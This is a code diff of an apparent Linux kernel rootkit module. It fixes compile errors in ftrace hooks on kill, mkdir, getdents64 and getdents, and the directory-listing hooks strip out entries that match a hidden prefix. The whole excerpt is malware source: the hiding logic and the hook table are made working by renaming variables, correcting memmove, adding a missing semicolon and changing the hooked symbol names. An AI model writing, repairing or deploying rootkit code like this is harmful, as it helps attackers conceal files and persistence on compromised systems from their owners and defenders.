@@ -119,12 +119,12 @@ static asmlinkage int hook_mkdir(const struct pt_regs *regs){
 */
 static asmlinkage long hook_getdents64(const struct pt_regs *regs){
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-    struct linux_dirent64 *current_dir, *dirent_ker, *previouse_dir = NULL;
+    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
     long error;
     unsigned long index = 0;
 
     // get real output with all files in a directory
-    int reg = orig_getdents64(regs);
+    int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
     if((ret <=0) || (dirent_ker == NULL)){
         return ret;
@@ -145,7 +145,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs){
             // if the prefix is the first index of the list we have to move everything up
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen;
-                memmov(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                 continue;
             }
 
@@ -177,18 +177,18 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs){
     struct linux_dirent {
         unsigned long d_ino;
         unsigned long d_off;
-        unsignedshort d_reclen;
+        unsigned short d_reclen;
         char d_name[];
-    }
+    };
 
 
     struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
-    struct linux_dirent *current_dir, *dirent_ker, *previouse_dir = NULL;
+    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
     long error;
     unsigned long index = 0;
 
     // get real output with all files in a directory
-    int reg = orig_getdents(regs);
+    int ret = orig_getdents(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
     if((ret <=0) || (dirent_ker == NULL)){
         return ret;
@@ -209,7 +209,7 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs){
             // if the prefix is the first index of the list we have to move everything up
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen;
-                memmov(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                 continue;
             }
 
@@ -466,8 +466,8 @@ static unsigned long *get_syscall_table(void){
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
-    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("sys_getdents", hook_getdents, &orig_getdents),
 };
 
 /**
